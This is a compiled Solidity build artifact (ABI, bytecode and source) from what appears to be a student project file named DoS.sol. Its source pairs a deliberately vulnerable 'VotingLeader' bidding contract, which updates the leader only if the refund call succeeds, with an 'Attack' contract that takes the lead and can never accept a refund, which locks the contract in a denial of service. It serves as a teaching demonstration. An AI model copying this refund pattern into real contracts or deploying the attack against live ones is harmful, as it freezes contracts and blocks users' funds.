{
  "contractName": "Attack",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_votingleader",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506040516101f63803806101f6833981810160405281019061003291906100db565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610108565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100a88261007d565b9050919050565b6100b88161009d565b81146100c357600080fd5b50565b6000815190506100d5816100af565b92915050565b6000602082840312156100f1576100f0610078565b5b60006100ff848285016100c6565b91505092915050565b60e0806101166000396000f3fe608060405260043610601c5760003560e01c80639e5faafc146021575b600080fd5b60276029565b005b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16634fa519fa346040518263ffffffff1660e01b81526004016000604051808303818588803b158015609057600080fd5b505af115801560a3573d6000803e3d6000fd5b505050505056fea26469706673582212209fb6a3570e977227bf52e1aa8bf7324304e4adaa883f3ba2c65e99347b929aa864736f6c63430008130033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: UNLICENSED\r\npragma solidity ^0.8.19;\r\n\r\ncontract VotingLeader {\r\n\r\n    address public Leader; //Current voting leader\r\n    uint public PriceValue; //Current value\r\n\r\n    constructor() { Leader = msg.sender; } //set owner address as current leader\r\n    \r\n    function setValue() public payable { //value setting \r\n        require(\r\n        msg.value > PriceValue, \"Need to select more than the current value\"\r\n        );\r\n        (bool sent, ) = Leader.call{value: PriceValue}(\"\"); //calling current leader address + set current value\r\n        if (sent) {\r\n            PriceValue = msg.value; //update value after Ether sent\r\n            Leader = msg.sender; //update current leader\r\n        }\r\n    }\r\n}\r\n\r\ncontract Attack {\r\n    VotingLeader votingleader;\r\n    constructor(address _votingleader) {\r\n        votingleader = VotingLeader(_votingleader); //Initialising variable with vulnerable contract\r\n    }\r\n    function attack() public payable {\r\n        votingleader.setValue{value: msg.value}(); //calling the value set and sending Ether recieved\r\n    }\r\n}",
  "sourcePath": "C:\\Users\\joshu\\OneDrive\\Desktop\\Individual Project\\Smart Contracts\\contracts\\DoS.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.19+commit.7dd6d404.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2024-04-22T17:37:36.481Z",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}